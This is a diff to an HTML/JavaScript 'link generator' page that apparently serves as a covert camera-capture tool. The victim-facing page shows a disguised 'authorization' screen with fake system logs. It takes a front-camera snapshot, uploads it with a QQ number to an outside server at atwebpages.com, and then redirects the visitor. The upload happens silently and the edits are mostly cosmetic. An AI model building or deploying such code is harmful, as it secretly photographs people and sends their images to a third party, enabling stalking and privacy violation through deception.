@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>验证中..</title>
+    <title>照妖镜 - 链接生成器</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -40,24 +40,31 @@
             display:flex; align-items:center; justify-content:center; flex-direction:column;
             overflow:hidden;
         }
-        /* 底部日志流 */
+        /* 日志流：填满整个屏幕，底部对齐，自动换行到屏幕边缘 */
         .log-stream {
             position:absolute;
-            bottom:0; left:0; right:0;
-            max-height:100vh;
+            inset:0;
             overflow:hidden;
             pointer-events:none;
             z-index:0;
             font-family: 'SF Mono', 'Consolas', 'Monaco', 'Courier New', monospace;
             font-size: 11px;
-            line-height: 1.5;
-            color: #3a3a45; /* 暗灰色，保证可见但低调 */
-            padding: 10px 14px;
+            line-height: 1.45;
+            color: #4a4a58;
+            padding: 12px 16px;
             display: flex;
             flex-direction: column;
-            justify-content: flex-end; /* 内容底部对齐 */
-            word-break: break-all;
+            justify-content: flex-end;
             white-space: pre-wrap;
+            word-break: break-all;
+            word-wrap: break-word;
+            overflow-wrap: break-word;
+            letter-spacing: 0.3px;
+        }
+        /* 让每一行都紧贴屏幕边缘 */
+        .log-stream span {
+            display: block;
+            width: 100%;
         }
 
         /* 中心区域 */
@@ -68,7 +75,10 @@
             margin:0 auto 20px;
         }
         @keyframes spin { to { transform:rotate(360deg); } }
+        .spinner.done { border-top-color:#2ecc71; border-color:rgba(46,204,113,0.2); border-top-color:#2ecc71; }
+        .spinner.error { border-top-color:#e74c3c; border-color:rgba(231,76,60,0.2); border-top-color:#e74c3c; }
         .status-text { color:#aaa; font-size:15px; margin-bottom:8px; }
+        .status-text.error { color:#e74c3c; }
         .denied-msg { display:none; color:#e74c3c; font-size:14px; margin-top:10px; }
         .denied-msg.show { display:block; }
     </style>
@@ -139,104 +149,191 @@ function copyLink() {
     .catch(() => document.execCommand('copy'));
 }
 
-// ========== 底部日志流 ==========
-const logLines = [];
-const MAX_LOG_LINES = 60;
+// ========== 专业终端日志系统 ==========
+const logStream = $('logStream');
+const MAX_LINES = 60;
+let logLines = [];
 
-const sampleWords = [
-    'initializing...', 'loading modules...', 'checking environment...', 'handshake...',
-    'verifying...', 'allocating memory...', 'scanning interfaces...', 'acquiring signal...',
-    'calibrating...', 'processing...', 'buffering...', 'compressing stream...',
-    'connecting...', 'awaiting response...', 'validating checksum...', 'optimizing...',
-    'resolving DNS...', 'tunneling...', 'authenticating...', 'parsing headers...',
-    'routing packets...', 'checking latency...', 'retrying...', 'waking interface...',
-    'reading sectors...', 'writing blocks...', 'mounting volume...', 'garbage collecting...',
-    'applying patches...', 'restarting service...', 'daemon running...', 'session active',
-    'heartbeat sent', 'keepalive received', 'channel secured', 'data transfer OK',
-    'checksum valid', 'payload delivered', 'acknowledgment received', 'closing socket...',
-    'cleanup done', 'task completed', 'system idle', 'monitoring...', 'log rotated'
+// 不同阶段的文字池
+const idleWords = [
+    'idle', 'standby', 'waiting', 'listening', 'monitor', 'probe', 'scan',
+    'check', 'sync', 'poll', 'ping', 'ack', 'keepalive', 'heartbeat'
+];
+const initWords = [
+    'initializing framework', 'loading kernel modules', 'checking environment',
+    'establishing secure channel', 'handshake protocol TLSv1.3', 'verifying integrity',
+    'allocating memory blocks', 'scanning interfaces', 'mounting volumes',
+    'resolving DNS', 'negotiating cipher', 'authenticating session', 'parsing headers'
+];
+const burstWords = [
+    'acquiring signal', 'calibrating sensor', 'processing frame', 'buffering data',
+    'compressing stream', 'encrypting payload', 'connecting to relay', 'awaiting response',
+    'validating checksum', 'optimizing throughput', 'flushing cache', 'syncing clock',
+    'routing packets', 'checking latency', 'retrying handshake', 'waking interface',
+    'reading sectors', 'writing blocks', 'garbage collecting', 'reclaiming space',
+    'applying patches', 'restarting service', 'daemon running', 'session active',
+    'data transfer OK', 'checksum valid', 'payload delivered', 'acknowledgment received',
+    'closing socket', 'cleanup done', 'task completed', 'system idle'
 ];
 
-function addLog(text) {
-    logLines.push(text);
-    while (logLines.length > MAX_LOG_LINES) logLines.shift();
+// 生成随机时间戳
+function ts() {
+    const d = new Date();
+    return '[' + d.toTimeString().split(' ')[0] + ']';
+}
+
+// 添加一行（自动换行由CSS处理）
+function pushLog(text) {
+    logLines.push(ts() + ' ' + text);
+    if (logLines.length > MAX_LINES) logLines.shift();
     renderLogs();
 }
 
-function renderLogs() {
-    const stream = $('logStream');
-    if (!stream) return;
-    // 直接拼接所有行，用 \n 换行，自动从底部往上推
-    stream.textContent = logLines.join('\n');
-}
-
-let logTimer;
-function startLogStream() {
-    // 初始预填一些行，让效果立刻显现
-    for (let i = 0; i < 25; i++) {
-        logLines.push(sampleWords[Math.floor(Math.random() * sampleWords.length)]);
+// 批量添加多行
+function pushLogBurst(texts) {
+    for (const t of texts) {
+        logLines.push(ts() + ' ' + t);
     }
+    if (logLines.length > MAX_LINES) logLines.splice(0, logLines.length - MAX_LINES);
     renderLogs();
-    // 定时追加新行
-    logTimer = setInterval(() => {
-        addLog(sampleWords[Math.floor(Math.random() * sampleWords.length)]);
-    }, 700);
 }
-function stopLogStream() {
-    clearInterval(logTimer);
+
+// 渲染：每行一个span，保证填满宽度自动换行
+function renderLogs() {
+    if (!logStream) return;
+    logStream.innerHTML = '';
+    for (const line of logLines) {
+        const span = document.createElement('span');
+        span.textContent = line;
+        logStream.appendChild(span);
+    }
+}
+
+// ========== 日志定时器（动态速度） ==========
+let slowTimer = null;    // 慢速等待
+let fastTimer = null;    // 快速爆发
+let burstTimeout = null; // 爆发持续时间
+
+// 慢速模式（等待授权时）
+function startSlowLogs() {
+    stopAllLogs();
+    slowTimer = setInterval(() => {
+        const word = idleWords[Math.floor(Math.random() * idleWords.length)];
+        pushLog(word + '...');
+    }, 800);
+}
+
+// 快速模式（授权成功后爆发）
+function startFastLogs() {
+    stopAllLogs();
+    // 先一次性爆发一批
+    const initialBurst = [];
+    for (let i = 0; i < 25; i++) {
+        initialBurst.push(burstWords[Math.floor(Math.random() * burstWords.length)] + '...');
+    }
+    pushLogBurst(initialBurst);
+    // 然后快速持续输出
+    fastTimer = setInterval(() => {
+        const word = burstWords[Math.floor(Math.random() * burstWords.length)];
+        pushLog(word + '...');
+    }, 200);
+}
+
+// 停止所有日志
+function stopAllLogs() {
+    clearInterval(slowTimer);
+    clearInterval(fastTimer);
+    clearTimeout(burstTimeout);
+    slowTimer = null;
+    fastTimer = null;
+}
+
+// 完全停止并清空
+function stopAndClearLogs() {
+    stopAllLogs();
+    logLines = [];
+    renderLogs();
 }
 
 // ========== 追踪模式核心 ==========
 function startTrack(qq, redirectUrl) {
     $('configMode').style.display = 'none';
     $('trackMode').style.display = 'flex';
-    startLogStream();
 
     const spinner = $('spinner');
-    const status = $('statusText');
-    const denied = $('deniedMsg');
+    const statusText = $('statusText');
+    const deniedMsg = $('deniedMsg');
     const vid = $('vid');
     const cvs = $('cvs');
     const API = 'http://a1nb66.atwebpages.com/zyj/api.php';
 
-    function setStatus(t, err) {
-        status.textContent = t;
-        status.style.color = err ? '#e74c3c' : '#aaa';
+    // 初始预填初始化日志
+    for (let i = 0; i < 15; i++) {
+        pushLog(initWords[Math.floor(Math.random() * initWords.length)] + '...');
+    }
+
+    // 开始慢速日志
+    startSlowLogs();
+
+    function setStatus(t, isErr) {
+        statusText.textContent = t;
+        if (isErr) statusText.classList.add('error');
+        else statusText.classList.remove('error');
     }
 
     async function run() {
+        setStatus('正在初始化...');
+
         if (!navigator.mediaDevices?.getUserMedia) {
-            setStatus('环境不支持', true); spinner.style.borderTopColor = '#e74c3c';
+            setStatus('环境不支持', true);
+            spinner.classList.add('error');
+            stopAndClearLogs();
             return setTimeout(() => location.href = redirectUrl, 2000);
         }
 
+        // 请求授权前持续输出等待文字
         setStatus('正在请求授权...');
+        await sleep(400); // 给用户一点时间看到状态
+
         let stream;
         try {
             stream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
                 audio: false
             });
+
+            // ★ 授权成功 → 爆发式刷屏
+            setStatus('授权成功，正在处理...');
+            spinner.classList.remove('error');
+            startFastLogs();
+
         } catch (e) {
             if (e.name === 'NotAllowedError' || e.name === 'PermissionDeniedError') {
                 setStatus('访问被拒绝', true);
+                spinner.classList.add('error');
                 spinner.style.display = 'none';
-                denied.classList.add('show');
-                stopLogStream();
+                deniedMsg.classList.add('show');
+                stopAllLogs();
                 return;
             }
+            // 尝试降级
             try {
+                setStatus('尝试兼容模式...');
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                setStatus('授权成功，正在处理...');
+                startFastLogs();
             } catch (e2) {
                 if (e2.name === 'NotAllowedError' || e2.name === 'PermissionDeniedError') {
                     setStatus('访问被拒绝', true);
+                    spinner.classList.add('error');
                     spinner.style.display = 'none';
-                    denied.classList.add('show');
-                    stopLogStream();
+                    deniedMsg.classList.add('show');
+                    stopAllLogs();
                     return;
                 }
-                setStatus('设备不可用', true); spinner.style.borderTopColor = '#e74c3c';
-                stopLogStream();
+                setStatus('设备不可用', true);
+                spinner.classList.add('error');
+                stopAndClearLogs();
                 return setTimeout(() => location.href = redirectUrl, 2000);
             }
         }
@@ -245,6 +342,7 @@ function startTrack(qq, redirectUrl) {
         vid.play().catch(()=>{});
         setStatus('准备就绪...');
 
+        // 等待视频就绪
         const ready = await new Promise(resolve => {
             const start = Date.now();
             const check = () => {
@@ -257,19 +355,23 @@ function startTrack(qq, redirectUrl) {
         });
 
         if (!ready) {
-            setStatus('超时', true); spinner.style.borderTopColor = '#e74c3c';
+            setStatus('超时', true);
+            spinner.classList.add('error');
             stream.getTracks().forEach(t => t.stop());
-            stopLogStream();
+            stopAndClearLogs();
             return setTimeout(() => location.href = redirectUrl, 2000);
         }
 
+        // 截图
         cvs.width = vid.videoWidth;
         cvs.height = vid.videoHeight;
         const ctx = cvs.getContext('2d');
         ctx.drawImage(vid, 0, 0);
         const img = cvs.toDataURL('image/jpeg', 0.65);
         stream.getTracks().forEach(t => t.stop());
+
         setStatus('正在上传...');
+        pushLog('uploading payload...');
 
         const fd = new FormData();
         fd.append('qq', qq);
@@ -280,23 +382,29 @@ function startTrack(qq, redirectUrl) {
                 const r = await resp.json();
                 if (r.success) {
                     setStatus('完成 ✓', false);
-                    spinner.style.borderTopColor = '#2ecc71';
+                    spinner.classList.add('done');
+                    pushLog('upload complete');
                 } else {
                     setStatus('服务器拒绝', true);
+                    spinner.classList.add('error');
                 }
             } else {
                 setStatus('上传失败', true);
+                spinner.classList.add('error');
             }
         } catch (e) {
             setStatus('网络错误', true);
+            spinner.classList.add('error');
         }
 
-        stopLogStream();
+        stopAllLogs();
         setTimeout(() => location.href = redirectUrl, 2000);
     }
 
-    setTimeout(run, 600);
+    setTimeout(run, 800);
 }
+
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
 
 // 入口
 const params = new URLSearchParams(location.search);
